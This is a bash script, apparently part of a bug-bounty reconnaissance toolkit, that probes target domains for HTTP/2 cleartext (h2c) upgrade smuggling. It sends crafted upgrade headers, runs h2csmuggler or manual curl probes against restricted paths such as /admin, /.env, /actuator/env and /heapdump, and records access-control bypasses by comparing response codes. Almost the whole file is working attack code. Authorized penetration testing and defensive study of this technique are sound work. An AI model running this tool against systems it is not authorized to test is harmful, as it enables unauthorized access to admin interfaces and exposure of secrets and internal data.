#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  ct_smuggle_h2c.sh — HTTP/2 Cleartext Smuggling              ║
# ║  h2c upgrade abuse for access control bypass + restricted     ║
# ║  path enumeration via h2csmuggler                             ║
# ╚══════════════════════════════════════════════════════════════╝
set -uo pipefail

SCRIPT_NAME="ct_smuggle_h2c.sh"
SCRIPT_DESC="HTTP/2 Cleartext Smuggling"

script_usage() {
    echo "Usage: ${SCRIPT_NAME} [OPTIONS]"
    echo ""
    echo "  Test for HTTP/2 cleartext (h2c) upgrade smuggling to bypass"
    echo "  access controls and reach restricted paths."
    echo ""
    echo "Options:"
    echo "  -d, --domain DOMAIN    Target domain"
    echo "  --domains FILE         File with domains (one per line)"
    echo "  -u, --urls FILE        File with URLs to test (one per line)"
    echo "  -o, --out DIR          Output directory (default: ./out)"
    echo "  -t, --threads N        Concurrency (default: 30)"
    echo "  -h, --help             Show this help"
}

LIB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "${LIB_DIR}/lib.sh"
parse_common_args "$@"

phase_header "5" "$SCRIPT_DESC"

if [ -z "${DOMAIN:-}" ] && [ -z "${DOMAINS_FILE:-}" ] && [ -z "${URLS_FILE:-}" ]; then
    err "Provide --domain, --domains, or --urls"
    script_usage
    exit 1
fi

# ── Build domain list ─────────────────────────────────────────
DOMAIN_LIST="${OUT_DIR}/_ct_h2c_domains.txt"
> "$DOMAIN_LIST"

if [ -n "${DOMAINS_FILE:-}" ] && [ -f "$DOMAINS_FILE" ]; then
    sed 's/\*\.//' "$DOMAINS_FILE" | sort -u >> "$DOMAIN_LIST"
fi
if [ -n "${DOMAIN:-}" ]; then
    echo "$DOMAIN" | sed 's/\*\.//' >> "$DOMAIN_LIST"
fi
sort -u -o "$DOMAIN_LIST" "$DOMAIN_LIST"

domain_count=$(count_lines "$DOMAIN_LIST")
info "Testing ${domain_count} domain(s) for h2c smuggling"

# ── Output file ───────────────────────────────────────────────
FINDINGS_FILE="${OUT_DIR}/ct_h2c_smuggle_findings.txt"
> "$FINDINGS_FILE"

# ── Restricted paths to test via h2c bypass ───────────────────
RESTRICTED_PATHS=(
    "/admin"
    "/admin/"
    "/internal"
    "/internal/"
    "/debug"
    "/debug/"
    "/console"
    "/console/"
    "/actuator"
    "/actuator/health"
    "/actuator/env"
    "/actuator/info"
    "/actuator/mappings"
    "/management"
    "/management/"
    "/server-status"
    "/server-info"
    "/.env"
    "/config"
    "/config/"
    "/_debug"
    "/_debug/"
    "/graphql"
    "/api/internal"
    "/api/internal/"
    "/api/admin"
    "/api/v1/admin"
    "/metrics"
    "/prometheus"
    "/health"
    "/healthcheck"
    "/status"
    "/info"
    "/trace"
    "/heapdump"
    "/threaddump"
    "/jolokia"
    "/env"
)

# ── Helper: get normal response status for a path ─────────────
get_normal_status() {
    local url="$1"
    curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" "$url" 2>/dev/null || echo "000"
}

# ═══════════════════════════════════════════════════════════════
# Phase A: Check for h2c upgrade support
# ═══════════════════════════════════════════════════════════════
info "Checking h2c upgrade support..."

H2C_SUPPORTED="${OUT_DIR}/_ct_h2c_supported.txt"
> "$H2C_SUPPORTED"

while IFS= read -r domain; do
    [ -z "$domain" ] && continue
    info "  Testing h2c upgrade on ${domain}..."

    for scheme in "https" "http"; do
        url="${scheme}://${domain}/"

        # Test Connection: Upgrade, Upgrade: h2c
        resp=$(curl -sk -D- -o /dev/null --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" \
            -H "Connection: Upgrade, HTTP2-Settings" \
            -H "Upgrade: h2c" \
            -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" \
            "$url" 2>/dev/null || echo "")

        [ -z "$resp" ] && continue

        status=$(echo "$resp" | head -1 | grep -oP '\d{3}' | head -1)

        # HTTP 101 Switching Protocols = h2c upgrade supported
        if [ "$status" = "101" ]; then
            echo "[HIGH] H2C UPGRADE ACCEPTED: ${url} | HTTP 101 Switching Protocols" >> "$FINDINGS_FILE"
            warn "  ${RED}[HIGH]${NC} ${url} accepts h2c upgrade (HTTP 101)"
            echo "${scheme}://${domain}" >> "$H2C_SUPPORTED"
        fi

        # Check if the upgrade header is reflected/acknowledged even without 101
        upgrade_resp=$(echo "$resp" | grep -i '^upgrade:' | head -1 | tr -d '\r')
        connection_resp=$(echo "$resp" | grep -i '^connection:' | head -1 | tr -d '\r')

        if echo "$upgrade_resp" | grep -qi 'h2c'; then
            echo "[MEDIUM] H2C ACKNOWLEDGED: ${url} | Status: ${status} | ${upgrade_resp}" >> "$FINDINGS_FILE"
            log "  ${YELLOW}[MEDIUM]${NC} ${url} acknowledges h2c in response (status ${status})"
            echo "${scheme}://${domain}" >> "$H2C_SUPPORTED"
        fi

        # Check if Connection header accepts Upgrade
        if echo "$connection_resp" | grep -qi 'upgrade'; then
            echo "[INFO] ${url} Connection header includes Upgrade | Status: ${status}" >> "$FINDINGS_FILE"
        fi
    done
done < "$DOMAIN_LIST"

sort -u -o "$H2C_SUPPORTED" "$H2C_SUPPORTED"

# ═══════════════════════════════════════════════════════════════
# Phase B: h2csmuggler tool testing
# ═══════════════════════════════════════════════════════════════
if check_tool h2csmuggler 2>/dev/null; then
    info "Running h2csmuggler for access control bypass..."

    while IFS= read -r domain; do
        [ -z "$domain" ] && continue

        for scheme in "https" "http"; do
            base_url="${scheme}://${domain}"

            info "  h2csmuggler: ${base_url}"

            for path in "${RESTRICTED_PATHS[@]}"; do
                target_url="${base_url}${path}"

                # Get normal response first
                normal_status=$(get_normal_status "$target_url")

                # Skip paths that are already accessible or totally dead
                if [ "$normal_status" = "200" ] || [ "$normal_status" = "000" ]; then
                    continue
                fi

                # Run h2csmuggler
                h2c_resp=$(h2csmuggler -x "${base_url}" "${target_url}" 2>/dev/null || echo "")

                if [ -n "$h2c_resp" ]; then
                    # Extract status from h2csmuggler output
                    h2c_status=$(echo "$h2c_resp" | grep -oP '(status|Status).*?(\d{3})' | grep -oP '\d{3}' | head -1)

                    if [ -n "$h2c_status" ] && [ "$h2c_status" = "200" ] && [ "$normal_status" != "200" ]; then
                        echo "[CRITICAL] H2C BYPASS: ${target_url} | Normal: ${normal_status} | h2c: ${h2c_status}" >> "$FINDINGS_FILE"
                        warn "  ${RED}[CRITICAL]${NC} h2c bypass: ${target_url} (${normal_status} -> ${h2c_status})"
                    elif [ -n "$h2c_status" ] && [[ "$h2c_status" =~ ^(200|301|302)$ ]] && [[ "$normal_status" =~ ^(403|401|404)$ ]]; then
                        echo "[HIGH] H2C ACCESS CHANGE: ${target_url} | Normal: ${normal_status} | h2c: ${h2c_status}" >> "$FINDINGS_FILE"
                        warn "  ${YELLOW}[HIGH]${NC} h2c access change: ${target_url} (${normal_status} -> ${h2c_status})"
                    fi
                fi
            done
        done
    done < "$DOMAIN_LIST"
else
    warn "h2csmuggler not found — using manual h2c probes only"

    # ── Manual h2c probes for restricted paths ──
    info "Running manual h2c probes for restricted paths..."

    while IFS= read -r domain; do
        [ -z "$domain" ] && continue

        for scheme in "https" "http"; do
            base_url="${scheme}://${domain}"

            for path in "${RESTRICTED_PATHS[@]}"; do
                target_url="${base_url}${path}"

                # Normal request
                normal_status=$(get_normal_status "$target_url")
                if [ "$normal_status" = "200" ] || [ "$normal_status" = "000" ]; then
                    continue
                fi

                # h2c upgrade request
                h2c_resp=$(curl -sk -D- -o /dev/null -w "\n%{http_code}" \
                    --connect-timeout 8 --max-time 15 \
                    "${HUNT_UA_CURL[@]}" \
                    -H "Connection: Upgrade, HTTP2-Settings" \
                    -H "Upgrade: h2c" \
                    -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" \
                    "$target_url" 2>/dev/null || echo "")

                h2c_status=$(echo "$h2c_resp" | tail -1 | tr -d '\r\n')

                if [ -n "$h2c_status" ] && [ "$h2c_status" != "$normal_status" ]; then
                    if [ "$h2c_status" = "200" ] && [[ "$normal_status" =~ ^(403|401)$ ]]; then
                        echo "[HIGH] H2C MANUAL BYPASS: ${target_url} | Normal: ${normal_status} | h2c: ${h2c_status}" >> "$FINDINGS_FILE"
                        warn "  ${RED}[HIGH]${NC} Manual h2c bypass: ${target_url} (${normal_status} -> ${h2c_status})"
                    elif [[ "$h2c_status" =~ ^(200|301|302)$ ]] && [[ "$normal_status" =~ ^(403|401|404)$ ]]; then
                        echo "[MEDIUM] H2C STATUS DIFF: ${target_url} | Normal: ${normal_status} | h2c: ${h2c_status}" >> "$FINDINGS_FILE"
                        log "  ${YELLOW}[MEDIUM]${NC} h2c status diff: ${target_url} (${normal_status} -> ${h2c_status})"
                    fi
                fi
            done
        done
    done < "$DOMAIN_LIST"
fi

# ═══════════════════════════════════════════════════════════════
# Phase C: Test ALPN h2 vs h2c behavior differences
# ═══════════════════════════════════════════════════════════════
info "Testing HTTP/2 protocol behavior..."

while IFS= read -r domain; do
    [ -z "$domain" ] && continue

    # Test HTTP/2 support via ALPN
    h2_check=$(curl -sk -o /dev/null -w "%{http_version}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" --http2 "https://${domain}/" 2>/dev/null || echo "0")

    h11_check=$(curl -sk -o /dev/null -w "%{http_version}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" --http1.1 "https://${domain}/" 2>/dev/null || echo "0")

    echo "[INFO] ${domain} | HTTP/2 ALPN: ${h2_check} | HTTP/1.1: ${h11_check}" >> "$FINDINGS_FILE"

    # If HTTP/2 is supported, test for HTTP/2 exclusive paths
    if [ "$h2_check" = "2" ]; then
        log "  ${domain}: HTTP/2 supported via ALPN"

        # Test restricted paths via HTTP/2 vs HTTP/1.1
        for path in "/admin" "/internal" "/debug" "/actuator/env"; do
            h2_status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
                "${HUNT_UA_CURL[@]}" --http2 "https://${domain}${path}" 2>/dev/null || echo "000")
            h1_status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
                "${HUNT_UA_CURL[@]}" --http1.1 "https://${domain}${path}" 2>/dev/null || echo "000")

            if [ "$h2_status" != "$h1_status" ] && [ "$h2_status" != "000" ] && [ "$h1_status" != "000" ]; then
                if [ "$h2_status" = "200" ] && [[ "$h1_status" =~ ^(403|401)$ ]]; then
                    echo "[HIGH] HTTP/2 BYPASS: https://${domain}${path} | H2: ${h2_status} | H1.1: ${h1_status}" >> "$FINDINGS_FILE"
                    warn "  ${RED}[HIGH]${NC} HTTP/2 bypass: ${domain}${path} (H1.1:${h1_status} -> H2:${h2_status})"
                else
                    echo "[INFO] PROTOCOL DIFF: https://${domain}${path} | H2: ${h2_status} | H1.1: ${h1_status}" >> "$FINDINGS_FILE"
                fi
            fi
        done
    fi
done < "$DOMAIN_LIST"

# ── Cleanup ───────────────────────────────────────────────────
rm -f "$DOMAIN_LIST" "$H2C_SUPPORTED"

# ── Summary ───────────────────────────────────────────────────
if [ -s "$FINDINGS_FILE" ]; then
    sort -u -o "$FINDINGS_FILE" "$FINDINGS_FILE"
fi
finding_count=$(count_lines "$FINDINGS_FILE")
critical_count=$(grep -c '^\[CRITICAL\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)
high_count=$(grep -c '^\[HIGH\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)
medium_count=$(grep -c '^\[MEDIUM\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)

log "H2C smuggling: ${finding_count} total findings"
log "  CRITICAL (confirmed bypass):  ${critical_count}"
log "  HIGH (access control change):  ${high_count}"
log "  MEDIUM (h2c acknowledged):    ${medium_count}"
if [ "$critical_count" -gt 0 ]; then
    warn "Confirmed h2c access control bypass — HIGH SEVERITY"
fi
log "Results: ${FINDINGS_FILE}"
